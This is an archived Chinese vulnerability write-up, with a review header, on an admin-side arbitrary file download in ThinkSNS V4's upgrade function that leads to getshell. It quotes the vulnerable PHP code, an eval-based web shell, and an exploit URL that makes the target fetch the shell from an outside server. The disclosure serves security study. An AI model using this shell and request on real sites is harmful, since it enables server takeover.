---
source: "白阁文库 BaizeSec/bylibrary"
product: "ThinkSNSV4 build2017-09-13"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "ThinkSNS_V4"
prerequisites: "来源所述条件，未列明部分仍待核：管理员升级权限、网络读取/本地写PHP可执行"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-8bee55d4b22f52cc8fd07d07"
entity_id: "ve-5fb4af4124c241ecc88e0b15"
schema_version: "1"
canonical: "Web安全/CMS内容/ThinkSNS/ThinkSNS V4 后台任意文件下载导致getshell.md"
relation_type: "duplicate_of"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：管理员升级权限、网络读取/本地写PHP可执行

- **事实待核（1）**：与423同文核心，补发布日期/官方页面/原微信来源与data/upgrade落点。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **凭据与会话边界（2）**：默认用户密码写管理员账号但密码自设，不应抽成默认固定凭据漏洞。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

- **证据待核（3）**：下载地址需提交信息是源站流程描述不授权此审阅行动；缺实际HTTP返回验证。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ThinkSNS_V4 后台任意文件下载导致Getshell

## Affected Version 

	ThinkSNS官网：http://www.thinksns.com
	
	网站源码版本：ThinkSNS V4  更新时间：2017-09-13
	
	程序源码下载：http://www.thinksns.com/experience.html（填写信息后，提交并下载代码）
	
	默认后台地址：http://127.0.0.1/index.php?app=admin&mod=Public&act=login
	
	默认用户密码：管理员帐号: admin@admin.com 密码自设，大于6位

## Code analysis

存在漏洞代码`\ts4\apps\admin\Lib\Action\UpgradeAction.class.php`中的一个函数中。

	public function step1()
	{
	    $downUrl = $_GET['upurl'];
	    $downUrl = urldecode($downUrl);
	    $path = DATA_PATH.'/'.'upgrade/'.basename($downUrl);
	
	    // # 备份老配置文件
	    $oldConf = file_get_contents(CONF_PATH.'/thinksns.conf.php');
	    file_put_contents(DATA_PATH.'/old.thinksns.conf.php', $oldConf);
	
	    // # 下载增量包
	    is_dir(dirname($path)) or mkdir(dirname($path), 0777, true);
	    file_put_contents($path, file_get_contents($downUrl));
	    file_exists($path) or $this->showError('下载升级包失败，请检查'.dirname($path).'目录是否可写，如果可写，请刷新重试！');
	
	    // 验证hash判断包是否合法。
	    $filename = dirname($path).'/upgrade.json';
	    $data = file_get_contents($filename);
	    $data = json_decode($data, false);
	    if (md5_file($path) != $data->md5) {
	        $this->showError('更新包校验失败，请重新执行升级.');
	    }


函数

	file_put_contents — 将一个字符串写入文件
	file_get_contents — 将整个文件读入一个字符串


在这段函数中，先备份老配置文件，然后下载增量包，下载参数$downUrl未经过任何处理，直接下载到网站目录下，接着验证hash判断包是否合法，但是并没有删除下载的增量包，
导致程序在实现上存在任意文件下载漏洞，下载远程文件到网站目录下，攻击者可指定第三方url下载恶意脚本到网站目录，进一步触发恶意代码，控制网站服务器。
	
远程下载文件，在另一个服务器上创建door.php。

	<?php   
	echo "<?php";
	echo "eval(file_get_contents('php://input'));";  
	echo "?>";  
	?>  


远程下载 	

`http://127.0.0.1:8000/ts4/index.php?app=admin&mod=Upgrade&act=step1&upurl=http://192.168.86.194:8000/door.php`


会在`ts4\data\upgrade`出现下载的`door.php`文件。


## References

[ThinkSNS_V4 后台任意文件下载导致Getshell](https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&mid=2448903598&idx=1&sn=597d488c492fca52b49b0f5ddddcadb8&chksm=8b55ddf3bc2254e5135ff7f9a10cdde3ce710e32d53fb4575b02411a9b3bbe23ec26207f8196&mpshare=1&scene=23&srcid=0311KzWTeNcTSxfCLzcIRd7F#rd)


---

> 来源：白阁文库 BaizeSec/bylibrary
